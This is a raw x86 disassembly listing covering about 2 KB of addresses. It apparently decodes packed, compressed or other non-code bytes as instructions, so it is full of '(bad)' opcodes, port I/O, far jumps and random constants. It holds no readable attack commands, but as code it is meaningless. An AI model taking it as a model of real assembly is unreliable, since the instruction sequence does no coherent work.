  41952c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41952d:	imul   eax,edx,0xffffff8d
  419530:	dec    edi
  419531:	push   ebx
  419532:	pop    eax
  419533:	dec    ebp
  419534:	and    al,0xd4
  419536:	nop
  419537:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419538:	pop    ebp
  419539:	mov    esp,0x1bbb3a56
  41953e:	icebp  
  41953f:	push   esi
  419540:	mov    ecx,0xad7db5f2
  419546:	je     0x4195b4
  419548:	push   fs
  41954a:	jge    0x419537
  41954c:	in     al,0x20
  41954e:	(bad)  
  41954f:	sahf   
  419550:	pop    edi
  419551:	js     0x419567
  419553:	xchg   cl,ch
  419555:	popa   
  419556:	sahf   
  419557:	das    
  419558:	xor    al,0x53
  41955a:	mov    ebp,esp
  41955c:	in     al,0xd6
  41955e:	adc    eax,0x4cd660e9
  419563:	ins    DWORD PTR es:[edi],dx
  419564:	outs   dx,BYTE PTR ds:[esi]
  419565:	cs cmp esi,esp
  419568:	sub    BYTE PTR [edx-0x7e6c10b3],ah
  41956e:	pop    edx
  41956f:	jmp    0x30ce57f6
  419574:	push   eax
  419575:	push   eax
  419576:	call   0x395c5507
  41957b:	retf   
  41957c:	rcl    cl,1
  41957e:	mov    esi,0x91c97ae4
  419583:	rcl    DWORD PTR [esi],0x98
  419586:	ret    0x3c64
  419589:	in     eax,0x72
  41958b:	dec    edi
  41958c:	cmp    al,0xcf
  41958e:	mov    ecx,0x1a1c7c91
  419593:	jg     0x4195de
  419595:	out    dx,al
  419596:	iret   
  419597:	fist   WORD PTR ds:0x41a019f5
  41959d:	mov    bh,0xa
  41959f:	hlt    
  4195a0:	dec    edx
  4195a1:	mov    dl,0x6
  4195a3:	in     al,0x78
  4195a5:	sbb    bl,BYTE PTR [edx]
  4195a7:	das    
  4195a8:	dec    eax
  4195a9:	rol    BYTE PTR [edx],0x5c
  4195ac:	or     al,0xcc
  4195ae:	mov    edi,esp
  4195b0:	push   ss
  4195b1:	jne    0x419578
  4195b3:	xchg   edi,eax
  4195b4:	jecxz  0x41960d
  4195b6:	and    ch,bh
  4195b8:	adc    DWORD PTR [edi+0x2cc580d1],ebx
  4195be:	cld    
  4195bf:	int3   
  4195c0:	packsswb mm1,mm3
  4195c3:	and    cl,BYTE PTR [ecx]
  4195c5:	sub    al,0x21
  4195c7:	scas   al,BYTE PTR es:[edi]
  4195c8:	aas    
  4195c9:	fdiv   QWORD PTR [ebp+0x5ec96ede]
  4195cf:	ds sub eax,0xb3e7dcfc
  4195d5:	adc    al,0x2e
  4195d7:	sbb    bh,dl
  4195d9:	jmp    0x7670:0x578bb780
  4195e0:	jl     0x4195ae
  4195e2:	pop    edi
  4195e3:	mov    cl,0x7c
  4195e5:	adc    ch,ah
  4195e7:	(bad)  
  4195e8:	arpl   WORD PTR [eax-0x2f],si
  4195eb:	int3   
  4195ec:	inc    eax
  4195ed:	mov    eax,0xe8fb0b13
  4195f2:	imul   eax,esi,0x9e678ad1
  4195f8:	and    BYTE PTR gs:[ebp+0x76036ec],al
  4195ff:	aam    0x13
  419601:	imul   ebx,DWORD PTR [ebx+0x51fe5f89],0x6238f905
  41960b:	daa    
  41960c:	outs   dx,BYTE PTR ds:[esi]
  41960d:	dec    eax
  41960e:	out    dx,eax
  41960f:	test   BYTE PTR [edi+0x2408aa85],bl
  419615:	les    esi,FWORD PTR fs:[esi-0x1e]
  419619:	jle    0x419679
  41961b:	test   DWORD PTR [ebx+0x38],eax
  41961e:	(bad)  
  41961f:	jecxz  0x41962e
  419621:	ins    BYTE PTR es:[edi],dx
  419622:	in     eax,dx
  419623:	push   ds
  419624:	mov    bh,BYTE PTR [esi+ebp*1]
  419627:	push   es
  419628:	pushf  
  419629:	and    BYTE PTR ds:0x4c321aa3,al
  41962f:	fstp   DWORD PTR [ecx+0x43650b02]
  419635:	aas    
  419636:	dec    edi
  419637:	jns    0x41968c
  419639:	adc    BYTE PTR [ecx+0x62242002],0x73
  419640:	sub    ebp,DWORD PTR [edi-0x43]
  419643:	mov    esp,0x764eb3c
  419648:	mov    ecx,0x4335048e
  41964d:	jmp    0xcb102715
  419652:	loop   0x4196a0
  419654:	in     al,0xdd
  419656:	mov    bh,0x1a
  419658:	scas   eax,DWORD PTR es:[edi]
  419659:	(bad)  
  41965a:	or     BYTE PTR [ebp-0x5e],ch
  41965d:	cmp    dh,BYTE PTR [eax+ecx*2]
  419660:	add    DWORD PTR [esi+0x34d948aa],edx
  419666:	fsubr  QWORD PTR [edx-0x3b]
  419669:	in     al,0xe
  41966b:	xor    eax,0xce021114
  419670:	xor    al,0xfb
  419672:	pop    edi
  419673:	inc    edx
  419674:	pop    DWORD PTR [edi+0x7b5ae57e]
  41967a:	mov    DWORD PTR [edx-0x46d4dfe0],ebx
  419680:	mov    ecx,0x4a9db974
  419685:	sahf   
  419686:	mov    edi,0x2374f2d
  41968b:	pop    edx
  41968c:	sub    eax,0x46435b04
  419691:	add    eax,0x22092f1e
  419696:	xchg   ecx,eax
  419697:	repnz loopne 0x4196bb
  41969a:	loopne 0x4196eb
  41969c:	test   esi,eax
  41969e:	mov    DWORD PTR ds:0x79f210d5,ecx
  4196a4:	in     eax,0xe9
  4196a6:	mov    ebx,0x9e66ba4d
  4196ab:	xchg   ebx,eax
  4196ac:	retf   0x4b
  4196af:	es in  eax,dx
  4196b1:	pop    esp
  4196b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196b3:	fdivrp st(7),st
  4196b5:	jg     0x41972b
  4196b7:	mov    esp,DWORD PTR [edx+0x4c50e199]
  4196bd:	mov    ebp,0x769464aa
  4196c2:	or     BYTE PTR [ebp-0x20],ah
  4196c5:	(bad)  
  4196c6:	mov    edx,0x27ebfdf
  4196cb:	or     DWORD PTR [ebx],0xabd29ed6
  4196d1:	sub    eax,0xe60e50c6
  4196d6:	popf   
  4196d7:	test   DWORD PTR [edx],esp
  4196d9:	jmp    0x41970f
  4196db:	cwde   
  4196dc:	sub    esp,DWORD PTR [edx]
  4196de:	xor    cl,dl
  4196e0:	sub    eax,0x5e82f45d
  4196e5:	xor    DWORD PTR [ebx+0x7775ee7f],esp
  4196eb:	dec    esi
  4196ec:	cmp    eax,0x57641dfb
  4196f1:	push   0xb9591114
  4196f6:	sti    
  4196f7:	inc    edi
  4196f8:	jo     0x4196c0
  4196fa:	xor    esp,0x8ec0cbc7
  419700:	test   eax,0x2d35fb1c
  419705:	pop    eax
  419706:	mov    ebp,0xe1d778bf
  41970b:	aad    0xf5
  41970d:	pop    ebp
  41970e:	xor    esp,esp
  419710:	in     al,0x83
  419712:	mov    edi,0x2c7c3919
  419717:	popa   
  419718:	xor    DWORD PTR [edx+0x45],ecx
  41971b:	xlat   BYTE PTR ds:[ebx]
  41971c:	(bad)  
  41971d:	sar    al,1
  41971f:	and    ebp,DWORD PTR [edi-0x83f290b]
  419725:	aam    0x68
  419727:	push   ebp
  419728:	sub    BYTE PTR [eax+edi*1+0x3f],cl
  41972c:	push   cs
  41972d:	sub    BYTE PTR [esp+edx*4+0x3140f3f8],bh
  419734:	dec    edx
  419735:	(bad)  
  419736:	pop    ds
  419737:	and    BYTE PTR [edi],0x5
  41973a:	lods   eax,DWORD PTR ds:[esi]
  41973b:	and    DWORD PTR [eax+0x7263a335],esi
  419741:	and    BYTE PTR [esi-0x5e],0x63
  419745:	int    0x65
  419747:	jae    0x419755
  419749:	or     al,0x9d
  41974b:	icebp  
  41974c:	(bad)  
  41974d:	xchg   esi,eax
  41974e:	cli    
  41974f:	xchg   DWORD PTR [ebp-0x3f30015],ecx
  419755:	xchg   DWORD PTR [edx],edi
  419757:	xchg   ebp,eax
  419758:	lea    ebx,[esi+0x6fca1b76]
  41975e:	ss repnz out 0xe3,al
  419762:	inc    ebp
  419763:	retf   
  419764:	xor    BYTE PTR [ebp-0x73],0x3f
  419768:	(bad)  
  419769:	jns    0x41977f
  41976b:	leave  
  41976c:	mov    ch,dh
  41976e:	inc    esi
  41976f:	mov    ecx,0xded2f03e
  419774:	aad    0xca
  419776:	pop    ebx
  419777:	jg     0x419785
  419779:	test   esp,esp
  41977b:	stos   BYTE PTR es:[edi],al
  41977c:	lea    edx,[esp+esi*4]
  41977f:	fmul   st(4),st
  419781:	add    DWORD PTR [eax],ebx
  419783:	mov    ds:0x536e0b5a,al
  419788:	push   ecx
  419789:	mov    dh,0xad
  41978b:	lds    edx,FWORD PTR [eax+0x1502db10]
  419791:	mov    bh,0x42
  419793:	cmp    BYTE PTR [esp+esi*4+0x28a3a46b],ah
  41979a:	sbb    eax,0x3b3fe7fa
  41979f:	pop    esi
  4197a0:	sub    ch,BYTE PTR [eax]
  4197a2:	pop    esi
  4197a3:	jmp    0xfd87:0x92c7aa53
  4197aa:	xor    ah,BYTE PTR ds:0x4106a759
  4197b0:	outs   dx,BYTE PTR ds:[esi]
  4197b1:	stos   DWORD PTR es:[edi],eax
  4197b2:	gs popa 
  4197b4:	pusha  
  4197b5:	les    edi,FWORD PTR [edx-0x55e64e55]
  4197bb:	daa    
  4197bc:	or     DWORD PTR [ebx],edi
  4197be:	jg     0x4197f5
  4197c0:	and    BYTE PTR [ebp-0x3e],bh
  4197c3:	inc    edx
  4197c4:	daa    
  4197c5:	inc    ebp
  4197c6:	sub    dl,BYTE PTR [eax-0x1f4d289]
  4197cc:	test   eax,0x579383a8
  4197d1:	mov    eax,DWORD PTR [edi]
  4197d3:	cmp    eax,0x588a0a54
  4197d8:	sub    ebp,edi
  4197da:	addr16 pop esi
  4197dc:	xor    dl,dh
  4197de:	or     DWORD PTR [eax+0x9f85255],ebx
  4197e4:	and    ebp,edi
  4197e6:	repz pushf 
  4197e8:	or     al,0xde
  4197ea:	adc    al,0x76
  4197ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197ed:	xor    DWORD PTR [ebp-0x68b05a8b],eax
  4197f3:	sbb    bl,al
  4197f5:	mov    dh,0x40
  4197f7:	push   ebp
  4197f8:	mov    WORD PTR [edi+0x54],?
  4197fb:	fstp   TBYTE PTR [ebp+0x510d61a1]
  419801:	adc    al,0x19
  419803:	fcomp  DWORD PTR [ecx+edx*8-0x1]
  419807:	dec    esi
  419808:	div    edi
  41980a:	mov    ebp,0xf6107b75
  41980f:	push   0x28
  419811:	or     eax,0x7124bcd8
  419816:	arpl   WORD PTR [ebp+0x6f],dx
  419819:	push   esi
  41981a:	push   eax
  41981b:	pop    ebp
  41981c:	inc    ebx
  41981d:	scas   al,BYTE PTR es:[edi]
  41981e:	ds cmp ebx,eax
  419821:	inc    esp
  419822:	jmp    0x419833
  419824:	push   ss
  419825:	nop
  419826:	test   DWORD PTR [edx+0x57f46f61],edx
  41982c:	rcr    BYTE PTR [ebx],cl
  41982e:	loop   0x419883
  419830:	ss mov dl,0xfe
  419833:	jb     0x419821
  419835:	out    dx,eax
  419836:	out    dx,al
  419837:	iret   
  419838:	sar    ch,0x30
  41983b:	jle    0x4197dd
  41983d:	int3   
  41983e:	xlat   BYTE PTR ds:[ebx]
  41983f:	push   0xb5fbc7cf
  419844:	(bad)  
  419845:	mov    ecx,0xa8e3fe5b
  41984a:	mov    dh,0xf3
  41984c:	outs   dx,BYTE PTR ds:[esi]
  41984d:	int    0x63
  41984f:	sbb    dl,BYTE PTR [ebp-0x45e8d2c1]
  419855:	adc    BYTE PTR [eax-0x6be93b17],bh
  41985b:	push   0x32
  41985d:	dec    edx
  41985e:	mov    edi,0x2c3f342a
  419863:	push   ebx
  419864:	gs and al,0x2
  419867:	fadd   QWORD PTR [eax-0x12cbf622]
  41986d:	mov    esp,0x17f5e3f8
  419872:	ret    
  419873:	push   0xc7a3880e
  419878:	int3   
  419879:	sub    dl,BYTE PTR [edi]
  41987b:	jl     0x4198d0
  41987d:	sar    dl,0xc1
  419880:	xor    eax,0x97686398
  419885:	in     eax,0x33
  419887:	or     ebp,edx
  419889:	adc    al,0x5d
  41988b:	ss pop esp
  41988d:	inc    ebp
  41988e:	push   0xffffffb3
  419890:	rcr    DWORD PTR [ecx],cl
  419892:	fisub  DWORD PTR [esi-0x5b37f551]
  419898:	loop   0x419876
  41989a:	fsubr  st(7),st
  41989c:	test   BYTE PTR [edx+edi*2],ah
  41989f:	xchg   DWORD PTR [edi],esi
  4198a1:	dec    esi
  4198a2:	mov    ch,0xe0
  4198a4:	xor    eax,0x1a6e65ce
  4198a9:	jbe    0x4198e8
  4198ab:	adc    al,0xc4
  4198ad:	xchg   BYTE PTR es:[esi-0x2f365640],ah
  4198b4:	sub    dh,cl
  4198b6:	mov    eax,0x66e6b220
  4198bb:	daa    
  4198bc:	xchg   ecx,eax
  4198bd:	mov    esp,0xddb86440
  4198c2:	or     edi,DWORD PTR [ebx+0x4e]
  4198c5:	hlt    
  4198c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198c7:	mov    dh,0xe4
  4198c9:	ins    DWORD PTR es:[edi],dx
  4198ca:	add    DWORD PTR [ebx-0x17c40bb8],edi
  4198d0:	retf   0x2ae8
  4198d3:	data16 data16 mov dh,0x27
  4198d7:	ds pop esp
  4198d9:	jmp    0x4198c4
  4198db:	fsub   DWORD PTR [edx-0x2dea3bf9]
  4198e1:	jg     0x419911
  4198e3:	mov    gs,WORD PTR [eax+edi*8+0x44]
  4198e7:	aad    0xfd
  4198e9:	cmp    al,0xf3
  4198eb:	icebp  
  4198ec:	rcr    DWORD PTR [edx-0x59],1
  4198ef:	pop    ebp
  4198f0:	cmp    DWORD PTR [ebx],0x31
  4198f3:	cdq    
  4198f4:	cmc    
  4198f5:	mov    WORD PTR [eax+0x3eb2e8de],cs
  4198fb:	cmp    BYTE PTR [edi+eax*2],ch
  4198fe:	rcr    BYTE PTR [ebx+0x5f592bd2],0x6e
  419905:	sbb    ebp,0x99be5a1b
  41990b:	cli    
  41990c:	in     eax,0x1c
  41990e:	cs jne 0x4198b5
  419911:	scas   al,BYTE PTR es:[edi]
  419912:	shl    DWORD PTR [eax],0x38
  419915:	mov    bh,0x4d
  419917:	push   esp
  419918:	pushf  
  419919:	or     BYTE PTR [eax+0x66],0xd1
  41991d:	pop    ds
  41991e:	call   DWORD PTR [esi-0x540446e9]
  419924:	dec    edx
  419925:	ret    
  419926:	retf   0x9a48
  419929:	xchg   esp,eax
  41992a:	iret   
  41992b:	jg     0x4198b7
  41992d:	std    
  41992e:	dec    esi
  41992f:	pop    ds
  419930:	(bad)
  419934:	ja     0x41998d
  419936:	mov    ecx,0x95f2d55d
  41993b:	mov    edx,0xa04e5658
  419940:	sbb    dl,BYTE PTR [esi+0x35]
  419943:	test   BYTE PTR [esi+0x26],bh
  419946:	add    al,0x99
  419948:	sub    ecx,edi
  41994a:	sti    
  41994b:	mov    DWORD PTR [edx],0x39c5c9dc
  419951:	aas    
  419952:	and    al,0xf0
  419954:	(bad)  
  419956:	xchg   esp,eax
  419957:	hlt    
  419958:	jo     0x419954
  41995a:	or     ebx,DWORD PTR [ecx+0x2a25e278]
  419960:	outs   dx,DWORD PTR ds:[esi]
  419961:	add    eax,0xfc73a9e2
  419966:	(bad)  
  419968:	add    eax,ecx
  41996a:	fst    QWORD PTR [esi]
  41996c:	dec    edx
  41996d:	xchg   edi,eax
  41996e:	ret    0x1bb
  419971:	out    dx,al
  419972:	cdq    
  419973:	cmc    
  419974:	pop    ds
  419975:	arpl   WORD PTR [ebx+0x3f],si
  419978:	iret   
  419979:	pusha  
  41997a:	ret    
  41997b:	inc    edi
  41997c:	(bad)  
  41997d:	test   eax,0xaac6ac33
  419982:	imul   esi,edx,0x9ed7514e
  419988:	sti    
  419989:	jae    0x4199f3
  41998b:	mov    esi,0x484365a
  419990:	stos   DWORD PTR es:[edi],eax
  419991:	dec    ecx
  419992:	leave  
  419993:	dec    esp
  419994:	mov    cl,0x5f
  419996:	cli    
  419997:	jno    0x419950
  419999:	push   ecx
  41999a:	mov    cl,0xde
  41999c:	mov    DWORD PTR [edx],0x8a2c5c4a
  4199a2:	mov    BYTE PTR [edx+ecx*4-0x2b],ch
  4199a6:	cmp    DWORD PTR [ebp-0x5],0x40bcd2ca
  4199ad:	je     0x419939
  4199af:	jo     0x419981
  4199b1:	pop    esp
  4199b2:	arpl   si,bx
  4199b4:	aas    
  4199b5:	aad    0xa8
  4199b7:	es je  0x419a34
  4199ba:	cmp    dl,BYTE PTR [esi+0xbf3fe9e]
  4199c0:	js     0x419954
  4199c2:	push   0x212371d3
  4199c7:	push   edx
  4199c8:	xchg   edx,eax
  4199c9:	jnp    0x41996d
  4199cb:	cmc    
  4199cc:	xlat   BYTE PTR ds:[ebx]
  4199cd:	(bad)
  4199d0:	mov    ds:0x6e135e7e,eax
  4199d5:	mov    BYTE PTR [esi],bh
  4199d7:	lods   al,BYTE PTR ds:[esi]
  4199d8:	fisttp DWORD PTR [ebx]
  4199da:	cmp    al,BYTE PTR [esp+ebp*4-0x43e76c65]
  4199e1:	and    DWORD PTR [esi+0x188524f2],ebx
  4199e7:	ror    DWORD PTR [esi+0x35fa0fb0],0x7c
  4199ee:	cwd    
  4199f0:	sbb    ah,bh
  4199f2:	adc    ah,BYTE PTR [ecx-0x8c54735]
  4199f8:	cmovns ecx,DWORD PTR [esi]
  4199fb:	jmp    0xeca6:0xaf5c906e
  419a02:	dec    eax
  419a03:	(bad)  
  419a04:	leave  
  419a05:	sub    BYTE PTR [ebp-0x6b],0x5d
  419a09:	stos   DWORD PTR es:[edi],eax
  419a0a:	mov    DWORD PTR [ecx+0x69],ebx
  419a0d:	(bad)  
  419a0e:	cmc    
  419a0f:	rcl    BYTE PTR ss:[eax+ebx*1+0x31],1
  419a14:	shr    DWORD PTR ds:0xee187fe7,1
  419a1a:	pop    es
  419a1b:	mov    esi,0x30a8ddc9
  419a20:	sbb    esi,ecx
  419a22:	fwait
  419a23:	jne    0x4199da
  419a25:	pop    esp
  419a26:	fstp   DWORD PTR [ebp-0x1c]
  419a29:	jae    0x419a64
  419a2b:	mov    al,ds:0xe8af0572
  419a30:	lods   eax,DWORD PTR cs:[esi]
  419a32:	cmp    DWORD PTR [ebp+0x34e55820],0xc83910e3
  419a3c:	cmp    BYTE PTR [esi-0x4c],cl
  419a3f:	jl     0x4199c7
  419a41:	sub    BYTE PTR ds:0xf1cccf46,ch
  419a47:	pop    ebp
  419a48:	inc    eax
  419a49:	mov    ds:0x4d3e6d6d,al
  419a4e:	mov    ecx,0xefbf1d7b
  419a53:	(bad)  
  419a55:	ds loope 0x419a55
  419a58:	xchg   ebx,eax
  419a59:	gs jmp 0x687ef701
  419a5f:	jg     0x419ada
  419a61:	add    eax,0x3ff7bd16
  419a66:	or     BYTE PTR [edx],bl
  419a68:	dec    edx
  419a69:	sahf   
  419a6a:	and    ebx,DWORD PTR [ebp+0x6c]
  419a6d:	in     eax,0x50
  419a6f:	adc    esi,edi
  419a71:	mov    bh,0x18
  419a73:	add    eax,0x545444e0
  419a78:	push   es
  419a79:	loopne 0x419a2c
  419a7b:	xchg   edi,eax
  419a7c:	pop    es
  419a7d:	mov    bl,BYTE PTR [ecx+0x14]
  419a80:	retf   0x92e3
  419a83:	fisub  DWORD PTR [edi-0x1f]
  419a86:	ins    DWORD PTR es:[edi],dx
  419a87:	das    
  419a88:	pop    eax
  419a89:	push   esp
  419a8a:	xchg   esi,eax
  419a8b:	or     bl,bh
  419a8d:	ficom  WORD PTR [ecx-0x7e313289]
  419a93:	push   0xffffffaa
  419a95:	sbb    cl,bh
  419a97:	dec    ebx
  419a98:	add    DWORD PTR [ebx],0xffffffd5
  419a9b:	imul   DWORD PTR [edx-0x38]
  419a9e:	in     al,dx
  419a9f:	jmp    0x4df1cfb7
  419aa4:	push   esp
  419aa5:	or     eax,0xd46f8fa2
  419aaa:	or     al,0xa3
  419aac:	scas   eax,DWORD PTR es:[edi]
  419aad:	push   0x16ef33db
  419ab2:	test   BYTE PTR [esi],0x17
  419ab5:	daa    
  419ab6:	xchg   ecx,eax
  419ab7:	inc    edi
  419ab8:	scas   al,BYTE PTR es:[edi]
  419ab9:	cmp    eax,0x50cbd584
  419abe:	push   ebx
  419abf:	dec    ebx
  419ac0:	int3   
  419ac1:	xchg   esp,eax
  419ac2:	shr    DWORD PTR [ebp+0x62f6cd75],1
  419ac8:	or     ecx,DWORD PTR [ecx]
  419aca:	jg     0x419a80
  419acc:	ficomp DWORD PTR [ecx-0x4c]
  419acf:	push   edx
  419ad0:	dec    ecx
  419ad1:	or     al,0x39
  419ad3:	push   edi
  419ad4:	dec    edi
  419ad5:	pop    esp
  419ad6:	mov    ebx,0x58536212
  419adb:	call   0xd802:0xe92b779
  419ae2:	pop    es
  419ae3:	out    dx,al
  419ae4:	popf   
  419ae5:	add    al,0xf9
  419ae7:	enter  0x9314,0xea
  419aeb:	and    eax,0xe2cb9597
  419af0:	inc    esp
  419af1:	cmp    eax,0xd2ad8977
  419af6:	shr    edi,cl
  419af8:	sbb    DWORD PTR [eax+0x3e],edi
  419afb:	mov    eax,0x7af17b1f
  419b00:	add    cl,bh
  419b02:	add    bh,bh
  419b04:	(bad)  
  419b05:	mov    esi,0x541acaa4
  419b0a:	iret   
  419b0b:	iret   
  419b0c:	fidiv  WORD PTR [esp+esi*8-0x1584edfd]
  419b13:	and    al,0xa8
  419b15:	or     edi,esp
  419b17:	mov    esi,?
  419b19:	test   BYTE PTR [ecx-0x4ea06ac3],0x19
  419b20:	stc    
  419b21:	loop   0x419abb
  419b23:	dec    esp
  419b24:	dec    ebx
  419b25:	les    edx,FWORD PTR [ebx+0x33]
  419b28:	inc    esi
  419b29:	sub    BYTE PTR [edx+0x7bbc8cec],0x98
  419b30:	mov    dl,0xda
  419b32:	or     ah,BYTE PTR [esi+esi*2+0x50]
  419b36:	pop    ebx
  419b37:	bound  edi,QWORD PTR [ebx]
  419b39:	mov    edi,0xa98969c3
  419b3e:	sar    DWORD PTR [ebp+0x19],0x6d
  419b42:	retf   
  419b43:	mov    eax,DWORD PTR [edx-0x2d]
  419b46:	(bad)  
  419b47:	lods   eax,DWORD PTR ds:[esi]
  419b48:	push   ebp
  419b49:	push   edx
  419b4a:	jns    0x419b33
  419b4c:	bound  eax,QWORD PTR [eax+0x74]
  419b4f:	pop    esp
  419b50:	out    dx,al
  419b51:	push   ss
  419b52:	ins    BYTE PTR es:[edi],dx
  419b53:	(bad)  
  419b54:	fnsave [eax]
  419b56:	mov    ecx,0x47bc3e37
  419b5b:	imul   ecx,edi,0x3f76e7c6
  419b61:	ins    BYTE PTR es:[edi],dx
  419b62:	push   DWORD PTR [esi+0x7895152c]
  419b68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b69:	inc    esi
  419b6a:	dec    ebp
  419b6b:	(bad)  
  419b6c:	and    bh,BYTE PTR [ecx+0x27]
  419b6f:	add    al,0x88
  419b71:	loop   0x419b8f
  419b73:	dec    esp
  419b74:	aad    0xcb
  419b76:	daa    
  419b77:	repnz sub BYTE PTR [esi+0x5bc7cf52],0x3f
  419b7f:	clc    
  419b80:	inc    ebx
  419b81:	pop    ebp
  419b82:	add    al,0x73
  419b84:	arpl   WORD PTR [edi+esi*2],bp
  419b87:	jmp    0x419b2a
  419b89:	or     DWORD PTR [ebp-0x56e69580],edi
  419b8f:	mov    al,ds:0xc62fc0a4
  419b94:	add    cl,bh
  419b96:	push   esp
  419b97:	xlat   BYTE PTR ds:[ebx]
  419b98:	mov    ch,0xe5
  419b9a:	fld    TBYTE PTR [edx+0x4d245dd3]
  419ba0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ba1:	jae    0x419be4
  419ba3:	cmc    
  419ba4:	adc    bl,BYTE PTR [ebx]
  419ba6:	stos   BYTE PTR es:[edi],al
  419ba7:	int    0x64
  419ba9:	dec    edx
  419baa:	mov    cl,0x7f
  419bac:	pop    esp
  419bad:	je     0x419b7e
  419baf:	mov    ebp,0xf1cb5a2d
  419bb4:	xchg   BYTE PTR [esi+0x15],dl
  419bb7:	cmp    ch,al
  419bb9:	ins    DWORD PTR es:[edi],dx
  419bba:	in     al,dx
  419bbb:	and    edx,esp
  419bbd:	mov    al,0x4c
  419bbf:	hlt    
  419bc0:	loop   0x419bc1
  419bc2:	inc    ecx
  419bc3:	inc    edi
  419bc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bc5:	jecxz  0x419c24
  419bc7:	jp     0x419bc4
  419bc9:	and    BYTE PTR [edx-0x7a],0x2f
  419bcd:	jecxz  0x419b74
  419bcf:	xchg   esi,eax
  419bd0:	and    al,0xfd
  419bd2:	aas    
  419bd3:	loope  0x419ba0
  419bd5:	lock jnp 0x419c00
  419bd8:	and    DWORD PTR [ebp+ebp*1-0x1967421a],esi
  419bdf:	data16 loop 0x419c03
  419be2:	pop    ds
  419be3:	cdq    
  419be4:	add    ah,bl
  419be6:	pop    eax
  419be7:	repnz arpl WORD PTR [esi],bx
  419bea:	pop    ss
  419beb:	push   ds
  419bec:	rol    DWORD PTR [edx],1
  419bee:	jmp    0x419bdd
  419bf0:	mov    ebp,0x3d83e628
  419bf5:	fwait
  419bf6:	xor    al,BYTE PTR [edx-0x6d]
  419bf9:	je     0x419bab
  419bfb:	das    
  419bfc:	out    dx,eax
  419bfd:	cld    
  419bfe:	push   edi
  419bff:	add    esi,DWORD PTR [ecx+0x35]
  419c02:	in     eax,0xd3
  419c04:	pop    DWORD PTR [ebx+0x54]
  419c07:	jecxz  0x419c51
  419c09:	adc    DWORD PTR ds:0x681a23f9,ecx
  419c0f:	xor    ebx,ebx
  419c11:	scas   eax,DWORD PTR es:[edi]
  419c12:	pop    ebp
  419c13:	jecxz  0x419b9c
  419c15:	add    eax,0x125283af
  419c1a:	push   esp
  419c1b:	jl     0x419c38
  419c1d:	fmul   DWORD PTR [edi-0xdf9dbe5]
  419c23:	mov    al,ds:0x39970a3d
  419c28:	std    
  419c29:	retf   0x2cf0
  419c2c:	mov    eax,ds:0x36175c7e
  419c31:	idiv   DWORD PTR [ecx]
  419c33:	sbb    DWORD PTR [eax],ecx
  419c35:	sbb    eax,0xa2e20964
  419c3a:	imul   ebp,DWORD PTR [esi-0x7cf08499],0x57
  419c41:	add    al,0x7b
  419c43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c44:	outs   dx,BYTE PTR ds:[esi]
  419c45:	(bad)  
  419c46:	ret    0xedfd
  419c49:	mov    ch,0x36
  419c4b:	scas   al,BYTE PTR es:[edi]
  419c4c:	idiv   esp
  419c4e:	pop    ecx
  419c4f:	dec    eax
  419c50:	cmc    
  419c51:	xchg   ebx,eax
  419c52:	stos   DWORD PTR es:[edi],eax
  419c53:	xchg   ebx,eax
  419c54:	mov    ah,0x32
  419c56:	sub    al,0x6c
  419c58:	mov    esp,0x72e1bdfa
  419c5d:	into   
  419c5e:	int    0xe2
  419c60:	xor    al,al
  419c62:	sub    eax,DWORD PTR gs:[edi]
  419c65:	in     eax,dx
  419c66:	test   DWORD PTR [esi],0x2d9f5e90
  419c6c:	push   ds
  419c6d:	xchg   esi,eax
  419c6e:	xor    eax,0xbbb9c8bf
  419c73:	push   0xcbc10d84
  419c78:	dec    edi
  419c79:	jle    0x419ca1
  419c7b:	sahf   
  419c7c:	push   es
  419c7d:	pop    eax
  419c7e:	(bad)  
  419c7f:	call   0xca72bfd5
  419c84:	popf   
  419c85:	adc    edi,eax
  419c87:	jg     0x419c55
  419c89:	sti    
  419c8a:	push   0xbf63aa16
  419c8f:	add    DWORD PTR [ebp-0x453f93b5],eax
  419c95:	mov    esp,0xe7d5daf8
  419c9a:	cld    
  419c9b:	aaa    
  419c9c:	gs into 
  419c9e:	push   esp
  419c9f:	(bad)  
  419ca0:	aas    
  419ca1:	int3   
  419ca2:	jge    0x419c6c
  419ca4:	xchg   edx,eax
  419ca5:	lods   eax,DWORD PTR ds:[esi]
  419ca6:	jmp    0x3cb40cd6
  419cab:	ds rcl edi,cl
  419cae:	aas    
  419caf:	retf   
  419cb0:	sub    dh,al
  419cb2:	cmp    dl,BYTE PTR [ebx+esi*4+0x40c85f5d]
  419cb9:	jno    0x419c98
  419cbb:	or     DWORD PTR [eax*1-0x5552a43a],ecx
  419cc2:	rol    DWORD PTR [edi-0x4b],cl
  419cc5:	jns    0x419ce8
  419cc7:	sub    DWORD PTR [eax+0x3c],0x1276e5a9
  419cce:	enter  0xc510,0x64
  419cd2:	call   0x30df:0xb687d11e
  419cd9:	push   ecx
  419cda:	test   al,0xf9
  419cdc:	call   0x69796c4c
  419ce1:	mov    ds:0xa12d7d66,eax
  419ce6:	(bad)  
  419ce7:	adc    ebx,edx
  419ce9:	popf   
  419cea:	dec    BYTE PTR [edi-0x80]
  419ced:	inc    esp
  419cee:	retf   0x11b5
  419cf1:	sbb    eax,0x48c92c7e
  419cf6:	fimul  WORD PTR [edi]
  419cf8:	add    edi,DWORD PTR [edx+ecx*1+0x76fe6e01]
  419cff:	sbb    BYTE PTR [ecx+0x5e],dl
  419d02:	ret    
  419d03:	inc    edi
  419d04:	lahf   
  419d05:	jae    0x419d43
  419d07:	push   ss
  419d08:	test   eax,0xbfa5c36a
  419d0d:	pusha  
  419d0e:	cld    
  419d0f:	out    0xcf,eax
  419d11:	inc    esp
  419d12:	pop    es
  419d13:	jecxz  0x419cd4
  419d15:	cmp    esp,DWORD PTR [esp+edx*8+0x68]
  419d19:	xor    DWORD PTR [eax-0x27],ebx
  419d1c:	push   ebp
  419d1d:	out    dx,eax
  419d1e:	cmp    al,0xce
  419d20:	xchg   ebp,eax
  419d21:	test   DWORD PTR [ecx+ebx*2],edx
  419d24:	push   ss
  419d25:	add    al,0x30
  419d27:	leave  
  419d28:	mov    BYTE PTR [eax],ch
